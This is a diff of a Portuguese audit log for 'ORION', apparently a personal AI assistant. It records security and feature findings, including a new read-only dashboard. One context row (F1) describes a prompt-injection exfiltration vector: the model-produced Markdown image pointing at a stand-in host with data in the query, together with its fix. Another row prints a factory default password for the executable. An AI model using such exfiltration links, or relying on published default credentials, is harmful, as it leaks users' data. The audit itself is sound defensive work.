@@ -1,7 +1,7 @@
 # ORION — Plano de melhorias e o que foi feito
 
 > Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela, mais a segunda
-> rodada de 03/10/2026 (achados R1–R11) a terceira de 06/10/2026 (L1–L12: login, MCP, ferramentas) e a quarta de 06/10/2026 (V1–V7: visão, mídia, janela, briefing, captura, MCP). Cada achado tem ID, evidência e status. O que
+> rodada de 03/10/2026 (achados R1–R11) a terceira de 06/10/2026 (L1–L12: login, MCP, ferramentas) e a quarta de 06/10/2026 (V1–V8: visão, mídia, janela, briefing, captura, MCP, painel). Cada achado tem ID, evidência e status. O que
 > **não** foi verificado está na seção própria.
 > Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).
 
@@ -24,7 +24,7 @@ Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de f
 | E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
 | E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
 | E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
-| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 89 testes de navegador (86 com backend de mentira: fluxos, segurança, entrada, janela estreita, axe; 3 contra o Orion de verdade). Ver [ORION_FRONT.md](ORION_FRONT.md) |
+| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 8 puros testados em Node (95 testes) + 100 testes de navegador (97 com backend de mentira: fluxos, segurança, entrada, janela estreita, axe; 3 contra o Orion de verdade). Ver [ORION_FRONT.md](ORION_FRONT.md) |
 | E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
 | E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
 | F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |
@@ -66,7 +66,7 @@ Tudo testado no Linux (CI nos três sistemas no PR). Cada item novo abaixo tem r
 | L11 | Alta | *(achado rodando o Orion de verdade com o front real)* aprovar uma ação no navegador falhava com HTTP 422: o front retoma sem corpo e `POST /approvals/{id}/resume` exigia um | ✅ | Corpo opcional (canal `web` por padrão) + teste. Os testes com backend de mentira não pegavam; agora há 3 testes contra o app, a política e o SQLite reais (`tests/front_e2e/test_orion_real.py`): login por cookie, conversa, aprovação que **executa de verdade** depois do clique, audit no banco, servidor MCP real e desligamento limpo. `mcp.json` e `auth.db` viraram arquivos sensíveis (ler e escrever confirmam) |
 | L12 | Média | O Orion só rodava com Python e `uv`; faltava um executável; e o usuário padrão era `antonio` | ✅ no Linux; ⏳ Windows só no CI | Workflow `build-exe.yml`: compila (PyInstaller), **sobe o `.exe` e roda o teste de fumaça**, publica zip/release. Usuário padrão `admin`; senha de fábrica `261210@` **só no `.exe`**: não é anunciada antes do login, o app avisa depois, tem tela para trocar, e recusa subir exposto na rede enquanto ela valer. Ícone minimalista gerado por script |
 
-## Quarta rodada (06/10/2026): visão, mídia, janela, briefing, captura e MCP
+## Quarta rodada (06/10/2026): visão, mídia, janela, briefing, captura, MCP e painel
 
 Tudo testado no Linux com serviços de mentira (a suíte nova: visão, mídia/janela, briefing, captura, config e Telegram). Regras 28–30 em [ORION_REGRAS.md](ORION_REGRAS.md).
 
@@ -78,9 +78,10 @@ Tudo testado no Linux com serviços de mentira (a suíte nova: visão, mídia/ja
 | V4 | Baixa | Sem briefing: lembretes, agendamentos e tarefas só apareciam se o Antônio perguntasse | ✅ | `ORION_BRIEFING_AT` + `/briefing`: texto determinístico, um por dia, dentro de uma janela de 6 h para não mandar "bom dia" à noite |
 | V5 | Média | Sem captura: uma ideia no celular não chegava ao vault | ✅ (Telegram só API falsa) | `/capturar` (texto, link, foto, voz) grava na caixa de entrada do vault, fora do modelo, com destino confinado ao vault (regra 30) |
 | V6 | Média | O `mcp.example.json` tinha pacotes e nomes "de memória" e `@latest` no navegador | ✅ | Subi cada servidor (filesystem, fetch, git, Playwright, workspace-mcp) pelo `mcp-check`: nomes conferidos, versões fixadas. Achado: o cliente MCP só repassa o ambiente mínimo ao servidor, então atrás de proxy/CA corporativa o `uvx`/`npx` precisa do `env` declarado no servidor |
+| V8 | Baixa | O estado do Orion ficava espalhado: cota dos modelos só no log, uso das CLIs só em contador, aprovações e decisões em endpoints e tabelas separados | ✅ | Painel único: `GET /painel`, a tela **Painel** do front (`#/painel`, `Alt+6`, `/painel`) e o comando `/painel` do Telegram. Só leitura e sem segredo: do gateway só o tipo do último erro (nunca corpo, URL ou chave); aprovações e decisões sem os argumentos. Regra 31 |
 | V7 | Média | Ninguém decidira qual servidor de e-mail/agenda usar; muitos expõem `send_email` | ✅ (fluxo de login não testado) | `workspace-mcp` com `--permissions gmail:drafts calendar:full` **não registra envio**; classes e `allow` no exemplo; guia em [ORION_OPERACAO.md](ORION_OPERACAO.md) §5.1 |
 
-**Não verificado nesta rodada:** (a) `capturar_tela`, mídia e janela **nunca rodaram** fora do Linux e, no Linux deste ambiente, sem tela, `playerctl` nem `wmctrl`: só o argv e o parsing estão testados; os scripts de PowerShell (captura, teclas de mídia, janela) não foram executados em um Windows; (b) a visão não foi chamada contra um modelo real (o formato é o `chat/completions` com `image_url`); (c) o `/capturar` e o `/briefing` só contra a API falsa do Telegram; (d) o fluxo de login Google do `workspace-mcp` (precisa da sua conta); (e) o briefing **não** lê a agenda (decisão sua: exige rodar o agente sem ninguém olhando, regra 18).
+**Não verificado nesta rodada:** (a) `capturar_tela`, mídia e janela **nunca rodaram** fora do Linux e, no Linux deste ambiente, sem tela, `playerctl` nem `wmctrl`: só o argv e o parsing estão testados; os scripts de PowerShell (captura, teclas de mídia, janela) não foram executados em um Windows; (b) a visão não foi chamada contra um modelo real (o formato é o `chat/completions` com `image_url`); (c) o `/capturar` e o `/briefing` só contra a API falsa do Telegram; (d) o fluxo de login Google do `workspace-mcp` (precisa da sua conta); (e) o briefing **não** lê a agenda (decisão sua: exige rodar o agente sem ninguém olhando, regra 18); (f) o painel mostra o que **o Orion viu desde que subiu** (chamadas, falhas, 429, quarentena): **não é a cota do provedor**, que só o OmniRoute conhece, e zera ao reiniciar; o `/painel` do Telegram só rodou contra a API falsa.
 
 ## O que foi construído (por fase do NUCLEO)
 
@@ -172,7 +173,7 @@ Tudo testado no Linux com serviços de mentira (a suíte nova: visão, mídia/ja
 
 - ~~Briefing matinal no Telegram~~ (feito em 06/10: lembretes, agendamentos e tarefas; **a agenda do Google ainda não entra**).
 - ~~Captura rápida~~ (feito em 06/10: `/capturar`; o link é guardado como veio, sem buscar o título da página).
-- Painel único: cota por provedor, aprovações pendentes, audit, uso das CLIs (os contadores já existem).
+- ~~Painel único~~ (feito em 06/10: `GET /painel`, tela Painel, `/painel` no Telegram; a cota **real** por provedor ainda exige consultar o OmniRoute).
 - Modo estudo UNIMAR: resumo de PDF de aula e exercícios de UML/Java, com perfil de contexto próprio.
 - Roteamento por tipo de tarefa (barato/rápido vs. pesado) no lugar do regex de palavras-chave.
 - ~~Consolidação noturna da memória~~ (feito em 03/10: `orion/memory/consolidate.py`).
